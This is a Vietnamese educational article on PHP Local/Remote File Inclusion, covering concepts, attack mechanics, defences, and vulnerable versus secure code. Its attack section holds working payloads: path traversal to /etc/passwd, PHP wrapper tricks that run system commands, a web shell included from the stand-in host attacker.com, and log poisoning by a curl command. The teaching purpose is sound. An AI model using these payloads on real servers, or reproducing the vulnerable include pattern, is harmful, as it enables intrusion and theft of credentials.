# Local/Remote File Inclusion (LFI/RFI)

> **CWE**: CWE-98, CWE-829 | **Phân loại**: File Handling

## Kiến thức Nền tảng

Để các trang web hoạt động linh hoạt, lập trình viên thường sử dụng tính năng nạp file động (file inclusion). Hãy tưởng tượng tính năng này giống như việc bạn xây dựng một khung ảnh trống trên trang web, và tùy thuộc vào lựa chọn của người dùng (ví dụ: chọn ngôn ngữ tiếng Anh hay tiếng Việt), ứng dụng sẽ nạp bức ảnh hoặc tệp tin tương ứng vào khung đó. Trong ngôn ngữ PHP, các hàm như `include` hay `require` được dùng để thực hiện việc này. Nếu nạp các file nằm sẵn trên máy chủ của bạn, đó gọi là nạp file cục bộ (LFI). Nếu nạp các file từ một địa chỉ internet khác, đó gọi là nạp file từ xa (RFI).

```php
<?php
// Normal usage — loading language file based on user preference
$lang = $_GET['lang'];       // e.g., "en", "vi", "fr"
include("languages/" . $lang . ".php");
// Loads languages/en.php, languages/vi.php, etc.
?>
```

Tương tự, Python có `importlib`, Java có `ClassLoader`, nhưng PHP là mục tiêu chính vì `include()` **thực thi nội dung file** — bất kể nguồn gốc.

**LFI (Local File Inclusion)**: Include file từ hệ thống local server.
**RFI (Remote File Inclusion)**: Include file từ URL bên ngoài (yêu cầu `allow_url_include=On` trong php.ini).

## Mô tả lỗ hổng

Lỗ hổng File Inclusion xuất hiện khi ứng dụng cho phép người dùng tự ý quyết định tên hoặc đường dẫn của file được nạp vào khung ảnh đó mà không kiểm tra cẩn thận. Kẻ tấn công có thể chèn các ký tự chuyển thư mục (như `../../`) để bắt máy chủ tìm và hiển thị các file nhạy cảm trong hệ thống như mật khẩu (`/etc/passwd`), mã nguồn của ứng dụng (LFI). Nguy hiểm hơn, nếu máy chủ cho phép nạp file từ xa (RFI), kẻ tấn công sẽ trỏ đường dẫn đến một file chứa mã độc trên server của họ. Lúc này, máy chủ của bạn sẽ tải mã độc về và chạy trực tiếp, giúp kẻ tấn công chiếm quyền điều khiển toàn bộ hệ thống ngay lập tức.

## Cơ chế tấn công

**LFI — Path Traversal để đọc file hệ thống**:

```
# Basic path traversal to read /etc/passwd
https://victim.com/page.php?file=../../../../etc/passwd

# Null byte injection (PHP < 5.3.4) to bypass .php extension
https://victim.com/page.php?file=../../../../etc/passwd%00

# Double encoding to bypass basic filters
https://victim.com/page.php?file=..%252f..%252f..%252fetc/passwd
```

**PHP Wrappers — Đọc source code dưới dạng Base64**:

```
# php://filter wrapper to read source code without executing it
https://victim.com/page.php?file=php://filter/convert.base64-encode/resource=config.php
# Returns base64-encoded content of config.php (contains DB credentials)

# php://input wrapper for direct code execution (requires allow_url_include)
POST /page.php?file=php://input
Body: <?php system('whoami'); ?>

# data:// wrapper for inline code execution
https://victim.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

**RFI — Remote shell inclusion**:

```
# Host a PHP web shell on attacker's server
# shell.txt contains: <?php system($_GET['cmd']); ?>

https://victim.com/page.php?file=http://attacker.com/shell.txt
# PHP fetches and executes the remote file

# Execute commands through the included shell
https://victim.com/page.php?file=http://attacker.com/shell.txt&cmd=id
```

**LFI + Log Poisoning**:

```
# Step 1: Poison the access log with PHP code via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" https://victim.com/

# Step 2: Include the poisoned log file
https://victim.com/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami
```

## Biện pháp phòng thủ

- **Tóm tắt**: Hạn chế sử dụng dữ liệu từ người dùng để định tuyến đường dẫn tệp tin, cấu hình tắt tính năng bao gồm tệp từ xa và kiểm soát thư mục truy cập.
- **Các bước chi tiết**:
  - Whitelist file names: Chỉ cho phép include từ danh sách file được định nghĩa trước, không dùng user input trực tiếp.
  - Disable `allow_url_include`: Tắt trong php.ini để ngăn chặn RFI hoàn toàn.
  - Sử dụng `basename()`: Loại bỏ path traversal sequences (`../`).
  - `open_basedir` restriction: Giới hạn PHP chỉ truy cập file trong thư mục ứng dụng.
  - Chuyển sang template engine: Sử dụng Twig, Blade thay vì `include()` trực tiếp.

## Code Example

```php
<?php
// === VULNERABLE CODE ===
$page = $_GET['page'];
// DANGER: User input directly controls file inclusion
include("templates/" . $page);
// Attack: ?page=../../../../etc/passwd
// Attack: ?page=php://filter/convert.base64-encode/resource=../config.php


// === SECURE CODE ===

// Whitelist of allowed pages
$allowed_pages = [
    'home'    => 'home.php',
    'about'   => 'about.php',
    'contact' => 'contact.php',
];

$page = $_GET['page'] ?? 'home';

// Only include files from the predefined whitelist
if (array_key_exists($page, $allowed_pages)) {
    $safe_path = __DIR__ . '/templates/' . $allowed_pages[$page];

    // Verify resolved path is within templates directory
    $real_path = realpath($safe_path);
    $base_dir  = realpath(__DIR__ . '/templates/');

    if ($real_path && strpos($real_path, $base_dir) === 0) {
        include($real_path);
    } else {
        http_response_code(403);
        echo "Access denied";
    }
} else {
    http_response_code(404);
    echo "Page not found";
}
?>
```

## Xem thêm

- [File Upload](../../06-insecure-design/file-upload/) — Tải lên các tệp tin độc hại là một vector phổ biến để kết hợp và khai thác lỗ hổng Local File Inclusion (LFI).

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/file-path-traversal
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- CWE: https://cwe.mitre.org/data/definitions/98.html

## Giải thích thuật ngữ

- **LFI (Local File Inclusion)**: Lỗ hổng nạp tệp tin cục bộ từ máy chủ của ứng dụng.
- **RFI (Remote File Inclusion)**: Lỗ hổng nạp tệp tin từ xa từ máy chủ bên ngoài thông qua URL.
- **Log Poisoning**: Kỹ thuật chèn mã độc vào file nhật ký rồi dùng LFI để thực thi mã đó.
- **Web Shell**: File mã độc cho phép kẻ tấn công điều khiển máy chủ thông qua giao diện web.
- **Directory Traversal**: Kỹ thuật duyệt thư mục bằng cách dùng ký tự `../` để truy cập file ngoài phạm vi cho phép.
